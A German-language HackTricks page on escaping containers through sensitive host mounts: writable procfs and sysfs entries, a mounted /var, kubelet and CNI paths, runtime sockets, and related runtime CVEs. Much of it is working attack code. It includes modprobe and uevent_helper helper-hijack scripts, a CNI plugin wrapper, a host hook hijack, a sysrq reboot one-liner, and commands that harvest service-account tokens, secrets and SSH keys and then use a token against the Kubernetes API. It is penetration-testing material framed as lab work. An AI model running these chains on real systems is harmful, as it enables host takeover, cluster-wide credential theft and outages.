# Sensible Host-Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

Host-Mounts gehören zu den wichtigsten praktischen Angriffsflächen für einen Container-Escape, da sie die sorgfältig isolierte Prozesssicht häufig wieder auf eine direkte Sichtbarkeit von Host-Ressourcen zurücksetzen. Die gefährlichen Fälle beschränken sich nicht auf `/`. Bind-Mounts von `/proc`, `/sys`, `/var`, Runtime-Sockets, von kubelet verwaltetem Zustand oder gerätebezogenen Pfaden können Kernel-Steuerungen, Zugangsdaten, Dateisysteme benachbarter Container und Schnittstellen zur Runtime-Verwaltung offenlegen.

Diese Seite existiert getrennt von den einzelnen Schutzseiten, da das Missbrauchsmodell mehrere Bereiche umfasst. Ein beschreibbarer Host-Mount ist teilweise aufgrund von Mount-Namespaces, teilweise aufgrund von User-Namespaces, teilweise aufgrund der Abdeckung durch AppArmor oder SELinux und teilweise aufgrund des konkret offengelegten Host-Pfads gefährlich. Wenn dieses Thema separat behandelt wird, lässt sich die Angriffsfläche deutlich leichter analysieren.

## `/proc`-Exposure

procfs enthält sowohl gewöhnliche Prozessinformationen als auch Kernel-Steuerungsschnittstellen mit weitreichenden Auswirkungen. Ein Bind-Mount wie `-v /proc:/host/proc` oder eine Container-Sicht, die unerwartet beschreibbare proc-Einträge offenlegt, kann daher zur Offenlegung von Informationen, zu Denial of Service oder zur direkten Codeausführung auf dem Host führen.

Zu den besonders wertvollen procfs-Pfaden gehören:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (insbesondere `register` und `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Missbrauch

Beginne damit zu prüfen, welche besonders wertvollen procfs-Einträge sichtbar oder beschreibbar sind:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sys/fs/binfmt_misc/status \
/proc/sys/fs/binfmt_misc/register \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Diese Pfade sind aus unterschiedlichen Gründen interessant. `core_pattern`, `modprobe` und `binfmt_misc` können zu Pfaden für hostseitige Code-Execution werden, wenn sie beschreibbar sind. `kallsyms`, `kmsg`, `kcore` und `config.gz` sind leistungsfähige Quellen für Reconnaissance bei Kernel-Exploitation. `sched_debug` und `mountinfo` geben Prozess-, cgroup- und Dateisystemkontext preis, der dabei helfen kann, das Host-Layout aus dem Container heraus zu rekonstruieren.

Der praktische Wert der einzelnen Pfade unterscheidet sich, und wenn man sie so behandelt, als hätten sie alle dieselben Auswirkungen, wird die Triage schwieriger:

- `/proc/sys/kernel/core_pattern`
Wenn dieser Pfad beschreibbar ist, gehört er zu den wirkungsvollsten procfs-Pfaden, da der Kernel nach einem Crash einen Pipe-Handler ausführt. Ein Container, der `core_pattern` auf ein in seinem Overlay oder in einem gemounteten Host-Pfad gespeichertes Payload zeigen lassen kann, kann häufig hostseitige Code-Execution erlangen. Siehe auch [read-only-paths.md](protections/read-only-paths.md) für ein spezielles Beispiel.
- `/proc/sys/kernel/modprobe`
Dieser Pfad steuert den Userspace-Helper, den der Kernel verwendet, wenn er Logik zum Laden von Modulen aufrufen muss. Wenn er aus dem Container heraus beschreibbar ist und im Host-Kontext interpretiert wird, kann er zu einem weiteren Primitive für hostseitige Code-Execution werden. Besonders interessant ist er in Kombination mit einer Möglichkeit, den Helper-Pfad auszulösen.
- `/proc/sys/vm/panic_on_oom`
Dies ist normalerweise kein sauberer Escape-Primitive, kann aber Speicherdruck in einen hostweiten Denial of Service umwandeln, indem OOM-Bedingungen in ein Kernel-Panic-Verhalten umgewandelt werden.
- `/proc/sys/fs/binfmt_misc`
Wenn die Registrierungs-Schnittstelle beschreibbar ist, kann der Angreifer einen Handler für einen ausgewählten Magic Value registrieren und hostseitige Ausführung erlangen, sobald eine passende Datei ausgeführt wird.
- `/proc/config.gz`
Nützlich für die Triage von Kernel-Exploits. Damit lässt sich feststellen, welche Subsysteme, Mitigations und optionalen Kernel-Features aktiviert sind, ohne Metadaten von Host-Paketen zu benötigen.
- `/proc/sysrq-trigger`
Vor allem ein Denial-of-Service-Pfad, aber ein sehr schwerwiegender. Er kann den Host sofort neu starten, in eine Panic versetzen oder anderweitig stören.
- `/proc/kmsg`
Gibt Meldungen aus dem Kernel-Ringpuffer preis. Nützlich für Host-Fingerprinting, Crash-Analyse und in einigen Umgebungen zum Leaken von Informationen, die für Kernel-Exploitation hilfreich sind.
- `/proc/kallsyms`
Besonders wertvoll, wenn lesbar, da dieser Pfad exportierte Kernel-Symbolinformationen offenlegt und dabei helfen kann, Annahmen zur Address Randomization während der Entwicklung von Kernel-Exploits zu umgehen.
- `/proc/[pid]/mem`
Dies ist eine direkte Schnittstelle zum Prozessspeicher. Wenn der Zielprozess unter den erforderlichen ptrace-ähnlichen Bedingungen erreichbar ist, kann sie das Lesen oder Ändern des Speichers eines anderen Prozesses ermöglichen. Die tatsächlichen Auswirkungen hängen stark von Credentials, `hidepid`, Yama und ptrace-Beschränkungen ab, weshalb es sich um einen leistungsfähigen, aber bedingten Pfad handelt.
- `/proc/kcore`
Gibt eine Ansicht des Systemspeichers im Stil eines Core-Images preis. Die Datei ist riesig und umständlich zu verwenden, aber wenn sie sinnvoll lesbar ist, deutet dies auf eine stark exponierte Host-Speicheroberfläche hin.
- `/dev/kmem` und `/dev/mem`
Dies sind historisch wirkungsvolle Raw-Memory-**device**-Schnittstellen, keine procfs-Dateien. Auf vielen modernen Systemen fehlen sie oder sind stark eingeschränkt. Ein Container, der eine auf dem Host gemountete Kopie öffnen kann, sollte diese Exposure jedoch als kritisch behandeln. Prüfe sie zusammen mit anderen sensiblen `/dev`-Mounts, anstatt nach den nicht existierenden Pfaden `/proc/kmem` oder `/proc/mem` zu suchen.
- `/proc/sched_debug`
Leakt Scheduling- und Task-Informationen, die Host-Prozessidentitäten offenlegen können, selbst wenn andere Prozessansichten sauberer als erwartet aussehen.
- `/proc/[pid]/mountinfo`
Äußerst nützlich, um zu rekonstruieren, wo sich der Container tatsächlich auf dem Host befindet, welche Pfade durch Overlay unterstützt werden und ob ein beschreibbarer Mount Host-Inhalten oder nur der Container-Schicht entspricht.

Wenn `/proc/[pid]/mountinfo` oder Overlay-Details lesbar sind, verwende sie, um den Host-Pfad des Container-Dateisystems zu ermitteln:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Diese Befehle sind nützlich, da mehrere Host-Ausführungstechniken erfordern, einen Pfad innerhalb des Containers in den entsprechenden Pfad aus Sicht des Hosts umzuwandeln.

### Beispiel: Vorbereiten eines `modprobe`-Helper-Pfads

Wenn `/proc/sys/kernel/modprobe` aus dem Container beschreibbar ist und der Helper-Pfad im Host-Kontext interpretiert wird, kann er auf eine von einem Angreifer kontrollierte Payload umgeleitet werden. Das obere Verzeichnis des Overlays muss vom Host aus aufgelöst werden, und die Nachweisausgabe muss in dieselbe vom Host sichtbare Container-Schicht zurückgeschrieben werden, wenn der Container nicht ebenfalls den Host-Pfad `/tmp` mountet:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```
Der genaue Auslöser hängt vom Zielsystem und vom Verhalten des Kernels ab und wird absichtlich nicht erraten. Stelle den ursprünglichen Wert wieder her, bevor du das Labor verlässt. Wichtig ist, dass ein beschreibbarer Helper-Pfad einen zukünftigen Aufruf eines Kernel-Helpers auf von Angreifern kontrollierten Inhalt im Host-Pfad umleiten kann. Ein fehlendes `upperdir` des Overlay, ein Pfad, den der Host nicht auflösen kann, ein schreibgeschütztes Sysctl-Mount oder ein Kernel, der den ausgewählten Helper nie aufruft, unterbricht diese Kette.

### Vollständiges Beispiel: Kernel-Recon mit `kallsyms`, `kmsg` und `config.gz`

Wenn das Ziel eine Bewertung der Exploitability statt eines sofortigen Escapes ist:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Diese Befehle helfen bei der Beantwortung der Frage, ob nützliche Symbolinformationen sichtbar sind, ob aktuelle Kernelmeldungen interessante Zustände offenlegen und welche Kernel-Features oder Mitigations einkompiliert sind. Die Auswirkungen führen normalerweise nicht direkt zu einem escape, können aber die Analyse von Kernel-Schwachstellen erheblich beschleunigen.

### Vollständiges Beispiel: SysRq Host Reboot

Wenn `/proc/sysrq-trigger` beschreibbar ist und die Host-Ansicht erreicht:
```bash
echo b > /proc/sysrq-trigger
```
Der Effekt ist ein sofortiger Neustart des Hosts. Dies ist kein subtiler Fall, zeigt aber deutlich, dass die Freigabe von procfs weitaus schwerwiegender sein kann als die Offenlegung von Informationen.

## `/sys`-Exponierung

sysfs stellt große Mengen an Kernel- und Gerätestatus bereit. Einige sysfs-Pfade sind hauptsächlich für Fingerprinting nützlich, während andere die Ausführung von Hilfsprogrammen, das Geräteverhalten, die Konfiguration von Security-Modulen oder den Firmware-Zustand beeinflussen können.

Zu den besonders wichtigen sysfs-Pfaden gehören:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Diese Pfade sind aus unterschiedlichen Gründen relevant. `/sys/class/thermal` kann das Verhalten der Temperaturverwaltung und damit die Stabilität des Hosts in Umgebungen mit zu weitreichender Freigabe beeinflussen. `/sys/kernel/vmcoreinfo` kann Informationen zu Crash-Dumps und zum Kernel-Layout leaken, die beim Low-Level-Fingerprinting des Hosts helfen. `/sys/kernel/security` ist die von Linux Security Modules verwendete `securityfs`-Schnittstelle. Unerwarteter Zugriff darauf kann daher MAC-bezogene Zustände offenlegen oder verändern. EFI-Variablenpfade können Firmware-gestützte Boot-Einstellungen beeinflussen, wodurch sie weitaus schwerwiegender sind als gewöhnliche Konfigurationsdateien. `debugfs` unter `/sys/kernel/debug` ist besonders gefährlich, da es bewusst als entwicklerorientierte Schnittstelle konzipiert wurde und deutlich geringeren Sicherheitsanforderungen unterliegt als gehärtete, produktionsorientierte Kernel-APIs.

Jeder sysfs-Eintrag in dieser Liste ist **vom Kernel, der Konfiguration und der Hardware abhängig**. In aktuellen virtualisierten Nodes fehlen `uevent_helper`, EFI-Variablen und Einträge für thermische Geräte häufig vollständig. Erfassen Sie einen fehlenden Pfad als negative Voraussetzung, anstatt anzunehmen, dass ein Beispiel aus einem anderen Kernel anwendbar ist.

Nützliche Befehle zur Überprüfung dieser Pfade sind:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Was diese Befehle interessant macht:

- `/sys/kernel/security` kann offenlegen, ob AppArmor, SELinux oder eine andere LSM-Oberfläche auf eine Weise sichtbar ist, die nur auf dem Host hätte zugänglich sein sollen.
- `/sys/kernel/debug` ist oft der alarmierendste Fund in dieser Gruppe. Wenn `debugfs` eingehängt und lesbar oder beschreibbar ist, ist eine umfangreiche kernelnahe Angriffsfläche zu erwarten, deren genaues Risiko von den aktivierten Debug-Knoten abhängt.
- Die Offenlegung von EFI-Variablen ist weniger häufig, hat aber große Auswirkungen, da sie firmwaregestützte Einstellungen und nicht nur gewöhnliche Laufzeitdateien betrifft.
- `/sys/class/thermal` ist hauptsächlich für die Stabilität des Hosts und die Interaktion mit der Hardware relevant, nicht für einen sauberen Escape über eine Shell.
- `/sys/kernel/vmcoreinfo` dient hauptsächlich als Quelle für Host-Fingerprinting und Crash-Analyse und ist nützlich, um den Kernelzustand auf niedriger Ebene zu verstehen.

### Vollständiges Beispiel: `uevent_helper`

`/sys/kernel/uevent_helper` hängt vom Kernel und der Konfiguration ab und fehlt auf vielen aktuellen Systemen. Wenn die Datei vorhanden und beschreibbar ist und ein verwendbarer `uevent`-Trigger verfügbar ist, kann der Kernel einen von einem Angreifer kontrollierten Helper ausführen. Die Proof-Ausgabe muss einen Pfad verwenden, der sowohl aus der Host- als auch aus der Container-Sicht sichtbar ist:
```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
echo "No writable, pre-approved uevent trigger was found" >&2
exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```
Der Grund, warum dies funktioniert, ist, dass der Pfad des Helpers aus der Perspektive des Hosts interpretiert wird. Sobald er ausgelöst wird, läuft der Helper im Host-Kontext statt innerhalb des aktuellen Containers. `/sys/class/mem/null/uevent` ist eine konkrete Möglichkeit zum Auslösen auf Kernels, die diese Datei bereitstellen; andere Geräte können eigene `uevent`-Dateien bereitstellen, aber wähle auf echter Hardware nicht blind eine davon aus. Stelle den ursprünglichen Wert wieder her, bevor du die Laborumgebung verlässt. Melde diese Technik nicht als verfügbar, wenn die Helper-Datei oder ein kontrollierter Trigger fehlt.

## `/var`-Freigabe

Das Einbinden des `/var`-Verzeichnisses des Hosts in einen Container wird oft unterschätzt, weil es nicht so dramatisch aussieht wie das Einbinden von `/`. In der Praxis kann dies ausreichen, um Runtime-Sockets, Container-Snapshot-Verzeichnisse, von kubelet verwaltete Pod-Volumes, projizierte Service-Account-Tokens und die Dateisysteme benachbarter Anwendungen zu erreichen. Auf modernen Nodes befindet sich in `/var` häufig der operativ interessanteste Container-Status.

### Kubernetes-Beispiel

Ein Pod mit `hostPath: /var` kann häufig die projizierten Tokens anderer Pods und den Inhalt von Overlay-Snapshots lesen:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Diese Befehle sind nützlich, weil sie klären, ob der Mount lediglich unkritische Anwendungsdaten oder hochwirksame Cluster-Zugangsdaten offenlegt. Ein lesbarer Service-Account-Token kann lokale Codeausführung unmittelbar in Kubernetes-API-Zugriff umwandeln.

Wenn der Token vorhanden ist, überprüfe, worauf er zugreifen kann, anstatt bei der Entdeckung des Tokens aufzuhören:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Die Auswirkungen können hier deutlich größer sein als der lokale Node-Zugriff. Ein Token mit weitreichendem RBAC kann ein gemountetes `/var` in eine clusterweite Kompromittierung verwandeln.

### Docker- und containerd-Beispiel

Auf Docker-Hosts befinden sich die relevanten Daten häufig unter `/var/lib/docker`, während sie auf containerd-basierten Kubernetes-Nodes unter `/var/lib/containerd` oder snapshotter-spezifischen Pfaden liegen können:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Wenn das eingebundene `/var` beschreibbare snapshot-Inhalte eines anderen Workloads offenlegt, kann der Angreifer möglicherweise Anwendungsdateien verändern, Webinhalte platzieren oder Startskripte ändern, ohne die Konfiguration des aktuellen Containers anzufassen.

In einem **disposable lab workload** können beschreibbare snapshot-Inhalte die Manipulation von Anwendungen, die Wiederherstellung von Secrets oder lateral movement demonstrieren. Ordne die runtime container ID zuerst dem exakten snapshot zu und bearbeite niemals einen nicht zugehörigen oder produktiven snapshot:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```
Diese Befehle sind nützlich, weil sie die drei wichtigsten Auswirkungsbereiche gemounteter `/var`-Verzeichnisse zeigen: Manipulation von Anwendungen, Wiederherstellung von Secrets und laterale Bewegung in benachbarte Workloads.

Direkte Snapshot-Schreibvorgänge umgehen das normale State-Management der Runtime und können den Container beschädigen oder Beweise zerstören. Die schreibgeschützte Erkennung wurde lokal mit Dockers `overlay2` reproduziert: Ein Marker, der in einem benachbarten Disposable-Container geschrieben wurde, erschien unter `/var/lib/docker/overlay2/<id>/diff/`. Beschränke tatsächliche Änderungen an Snapshots auf einen für diesen Test erstellten Disposable-Container.

## Kubelet-State, Plugins und CNI-Pfade

Ein Mount von `/var/lib/kubelet`, `/opt/cni/bin` oder `/etc/cni/net.d` wird häufig über privilegierte DaemonSets, CNI-Agents, CSI-Node-Plugins, GPU-Operatoren und Storage-Hilfsprogramme bereitgestellt. Diese Mounts werden leicht als „Node-Infrastruktur“ abgetan, befinden sich jedoch direkt im Ausführungspfad für neue Pods und enthalten häufig Kubelet-Credentials, projizierte Secrets, Registrierungssockets und ausführbare Plugin-Binaries auf dem Host.

Zu den besonders wertvollen Zielen gehören:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Nützliche Review-Befehle sind:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Warum diese Pfade wichtig sind:

- `/var/lib/kubelet/pki` kann kubelet-Clientzertifikate und andere node-lokale Zugangsdaten offenlegen, die je nach Cluster-Design manchmal erneut gegen den API server oder kubelet-seitige TLS endpoints verwendet werden können.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` enthält häufig projizierte Service-Account-Tokens und gemountete Secrets für benachbarte Pods auf demselben Node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` ist hauptsächlich eine Reconnaissance-Oberfläche, aber eine sehr nützliche: Sie zeigt, welche Pods und Container derzeit GPUs, Hugepages, SR-IOV-Geräte und andere knappe node-lokale Ressourcen verwenden.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` und `/var/lib/kubelet/plugins_registry` zeigen, welche CSI-, DRA- und Device-Plugins installiert sind und mit welchen Sockets der kubelet erwartungsgemäß kommuniziert. Wenn diese Verzeichnisse beschreibbar statt nur lesbar sind, wird der Fund deutlich schwerwiegender.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` und `/etc/cni/net.d` liegen direkt im Pfad zur Einrichtung des Pod-Netzwerks. Schreibzugriff ist dort häufig ein verzögerter Primitive für host execution und nicht nur eine Offenlegung der Konfiguration.<sup>[[2]](#references)</sup>

### Vollständiges Beispiel: Beschreibbares `/opt/cni/bin`

Wenn ein Host-CNI-Binärverzeichnis mit Lese- und Schreibzugriff gemountet ist, kann das Ersetzen eines Plugins ausreichen, um beim nächsten Erstellen einer Pod-Sandbox durch den kubelet auf diesem Node host execution zu erlangen:<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```
Dies ist nicht so unmittelbar wie ein gemounteter `docker.sock`, aber in kompromittierten Kubernetes-Infrastruktur-Pods oft realistischer. Der Marker wird neben dem gemounteten Plugin geschrieben, sodass der Container ihn auch ohne einen host-root- oder host-`/tmp`-Mount abrufen kann. Der Wrapper bewahrt die ursprünglichen Argumente und die Standardeingabe, anschließend stellt das Beispiel die ursprüngliche Binary wieder her. Entscheidend ist, dass die modifizierte Binary später vom Host-Netzwerk-Setup ausgeführt wird, nicht vom aktuellen Container. Verwende ausschließlich einen entbehrlichen Node, da ein ungültiger Wrapper verhindern kann, dass neue Pod-Sandboxen Netzwerk erhalten.

## Runtime Sockets

Sensible Host-Mounts enthalten häufig Runtime-Sockets statt vollständiger Verzeichnisse. Diese sind so wichtig, dass sie hier ausdrücklich wiederholt werden sollten:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Siehe [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) für vollständige Exploit-Abläufe, sobald einer dieser Sockets gemountet ist.

Als schnelles erstes Interaktionsmuster:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Wenn eines davon erfolgreich ist, ist der Weg von einem „mounted socket“ zum „start a more privileged sibling container“ normalerweise deutlich kürzer als jeder Kernel breakout-Pfad.

## Hijacking von Tasks über beschreibbare Host-Pfade

Ein beschreibbarer Host-Mount muss nicht `/` freigeben, um gefährlich zu sein. Wenn der gemountete Pfad Skripte, Konfigurationsdateien, Hooks, Plugins oder Dateien enthält, die später von einem hostseitigen geplanten Task oder Dienst verwendet werden, kann der Container möglicherweise ändern, was der Host ausführt.

Allgemeiner Prüfablauf:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Wenn eine beschreibbare Datei von einem Host-Prozess verwendet wird, halten Sie die Payload beim Testen einfach und beobachtbar:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
Der interessante Teil ist die Trust Boundary: Der Schreibvorgang erfolgt innerhalb des Containers, die Ausführung findet jedoch später im Kontext des Host-Service statt. Dadurch wird ein begrenzter hostPath- oder bind mount zu einem verzögerten Primitive für die Codeausführung auf dem Host.

## Mount-bezogene CVEs

Host-Mounts stehen auch mit Runtime-Schwachstellen in Zusammenhang. Zu den wichtigen aktuellen Beispielen gehören:

- `CVE-2024-21626` in `runc`, wobei ein geleakter Verzeichnis-File-Descriptor das Arbeitsverzeichnis im Host-Dateisystem platzieren konnte.
- `CVE-2024-23651`, `CVE-2024-23652` und `CVE-2024-23653` in BuildKit, wobei bösartige Dockerfiles, Frontends und `RUN --mount`-Flows während Builds erneut Zugriff auf Host-Dateien, deren Löschung oder erhöhte Privilegien ermöglichen konnten.
- `CVE-2024-1753` in Buildah- und Podman-Build-Flows, wobei speziell erstellte bind mounts während des Builds `/` mit Lese- und Schreibzugriff offenlegen konnten.
- `CVE-2025-47290` in `containerd` 2.1.0, wobei ein TOCTOU während des Image-Unpackings es einem speziell erstellten Image ermöglichen konnte, das Host-Dateisystem während des Pull-Vorgangs zu verändern.

Diese CVEs sind hier relevant, weil sie zeigen, dass der Umgang mit Mounts nicht nur von der Operator-Konfiguration abhängt. Die Runtime selbst kann ebenfalls durch Mounts verursachte Escape-Bedingungen einführen.

## Prüfungen

Verwende diese Befehle, um die wichtigsten Mount-Exposures schnell zu finden:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Was ist hier interessant:

- Host-Root, `/proc`, `/sys`, `/var` und Runtime-Sockets sind allesamt Findings mit hoher Priorität.
- Schreibbare proc/sys-Einträge bedeuten häufig, dass der Mount globale Kernel-Steuerungen des Hosts statt einer sicheren Container-Ansicht offenlegt.
- Gemountete `/var`-Pfade erfordern eine Prüfung auf Credentials und benachbarte Workloads, nicht nur eine Dateisystemprüfung.
- Kubelet-Statusverzeichnisse und CNI-/Plugin-Pfade verdienen dieselbe Priorität wie Runtime-Sockets, da sie häufig direkt am Pfad zur Pod-Erstellung und Credential-Verteilung auf dem Node liegen.

## Status der lokalen Validierung

Die praktischen Chains auf dieser Seite wurden gegen einen lokalen Linux-minikube-Node geprüft. Die Validierung reproduzierte:

- Lese- und Schreibzugriff über einen temporären beschreibbaren hostPath
- die Ermittlung projizierter ServiceAccount-Tokens und gemounteter Secrets über `/var/lib/kubelet/pods`
- eine erfolgreiche Kubernetes-API-Authentifizierung mit einem gültigen Token, das aus diesem gemounteten Kubelet-Status wiederhergestellt wurde
- die schreibgeschützte Ermittlung eines benachbarten Docker-`overlay2`-Dateisystems über ein gemountetes `/var`
- die Erstellung eines Geschwister-Containers durch die Docker-API mit einem schreibgeschützten Host-Bind über einen gemounteten `docker.sock`
- eine verzögerte Host-Ausführung über einen temporären, vom Host konsumierten Hook
- eine CNI-Wrapper-Simulation, die die Argumente, die Standardeingabe und die Ausführung des ursprünglichen Plugins beibehielt

Derselbe Node legte `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` und `config.gz` offen, jedoch nicht `uevent_helper`, EFI-Variablen, Thermal-Einträge oder `sched_debug`. Destruktive Kernel-Trigger wurden nicht ausgeführt. Dies bestätigt, dass Chains mit Host-Root, `/var`, Kubelet-Status, Sockets und Host-Konsumenten reproduzierbar sind, während procfs-/sysfs-Helper-Techniken von dem exakten Kernel, dem Mount-Modus, dem Payload-Pfad und dem Trigger abhängig bleiben müssen.

## References

- [1] [Vom Kubelet verwendete lokale Dateien und Pfade](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [Der cilium-agent-Container kann über einen `hostPath`-Mount auf den Host zugreifen](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
